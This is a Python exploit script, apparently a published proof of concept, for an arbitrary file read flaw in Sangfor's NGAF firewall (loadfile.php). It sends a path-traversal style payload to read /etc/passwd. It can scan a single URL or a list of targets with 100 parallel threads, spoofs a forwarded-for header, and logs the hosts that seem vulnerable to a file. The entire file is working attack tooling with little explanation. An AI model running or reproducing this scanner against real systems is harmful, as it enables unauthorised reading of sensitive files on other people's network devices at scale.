#深信服 NGAF下一代防火墙 loadfile.php 任意文件读取漏洞
#导包外置
import requests,argparse,sys
from multiprocessing.dummy import Pool
# 关闭告警
requests.packages.urllib3.disable_warnings()

def banner():
    test = """███████╗███████╗    ██╗      ██████╗  █████╗ ██████╗ ███████╗██╗██╗     ███████╗
██╔════╝██╔════╝    ██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝██║██║     ██╔════╝
███████╗███████╗    ██║     ██║   ██║███████║██║  ██║█████╗  ██║██║     █████╗  
╚════██║╚════██║    ██║     ██║   ██║██╔══██║██║  ██║██╔══╝  ██║██║     ██╔══╝  
███████║███████║    ███████╗╚██████╔╝██║  ██║██████╔╝██║     ██║███████╗███████╗
╚══════╝╚══════╝    ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚═╝     ╚═╝╚══════╝╚══════╝
                                                                            author :CHKer
                                                                            version:1.0.0
  """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="深信服 NGAF下一代防火墙 loadfile.php 任意文件读取漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help=' input your url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload = '/svpn_html/loadfile.php?file=/etc/./passwd'
    headers = {
        'User-Agent': 'Opera/8.90.(Windows NT 6.0; is-IS) Presto/2.9.177 Version/10.00',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'y-forwarded-for': '127.0.0.1'
    }
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    try:
        res1 = requests.get(url=target+payload,headers=headers,timeout=10,verify=False,proxies=proxies)
        if res1.status_code == 200:
            print(f"[+]该url:{target}存在任意文件读取漏洞")
            with open('result10.txt','a', encoding='utf-8') as fp:
                fp.write(f"{target}"+"\n")
        else:
            print(f'[-]该url:{target}不存在任意文件读取漏洞')
    except:
        print(f'[-]该url:{target}该站点存在问题')

if __name__ == '__main__':
    main()